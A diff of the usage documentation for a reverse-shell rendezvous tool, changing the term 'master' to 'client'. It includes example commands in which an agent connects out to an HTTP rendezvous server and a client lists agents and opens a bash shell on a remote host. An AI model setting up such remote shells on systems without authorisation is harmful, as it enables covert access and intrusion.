@@ -1,10 +1,10 @@
 ## reverse-shell-rendezvous
 
-An http server listening for agents and masters
+An http server listening for agents and clients
 
 ### Synopsis
 
-The rendezvous is an http server listening for agents and masters.	It can run behind a reverse-proxy and that reverse-proxy could to SSL offloading.
+The rendezvous is an http server listening for agents and clients.	It can run behind a reverse-proxy and that reverse-proxy could to SSL offloading.
 
 ```
 reverse-shell-rendezvous [flags]
@@ -22,12 +22,12 @@ $ agent websocket -U http://1.2.3.4:7777
 
 Open a shell and send some commands
 # List the agents
-$ ./master list-agents -U http://1.2.3.4:7777
+$ ./client list-agents -U http://1.2.3.4:7777
 List of agents:
 * 3.4.5.6:65000
 
 # Create a session
-$ master create -U http://1.2.3.4:7777 3.4.5.6:65000
+$ client create -U http://1.2.3.4:7777 3.4.5.6:65000
 Attaching to admiring_meitn
 Connected to admiring_meitn
 bash-3.2$
